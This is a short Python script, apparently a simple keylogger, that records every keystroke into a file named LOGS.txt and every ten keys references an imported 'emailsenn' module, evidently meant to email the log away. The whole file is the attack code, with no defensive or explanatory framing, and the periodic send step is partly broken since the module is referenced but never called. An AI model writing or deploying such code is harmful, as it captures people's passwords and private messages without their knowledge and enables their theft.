import os, getkey
from getkey import *
import emailsenn

timer = 0

while True:

    timer += 1
    print(timer)
    key = getkey()
    L = open('LOGS.txt', "a")
    with open('LOGS.txt') as infile:
      words = 0
      characters = 0
      for lineno, line in enumerate(infile, 1):
        wordslist = line.split()
        words += len(wordslist)
        characters += sum(len(word) for word in wordslist)
    if key == '' and characters != 0:
      with open('LOGS.txt', 'rb+') as filehandle:
        filehandle.seek(-1, os.SEEK_END)
        filehandle.truncate()
    elif key != '':
      L.write(key)
      L.close()
    if timer == 10:
      emailsenn
      timer = 0
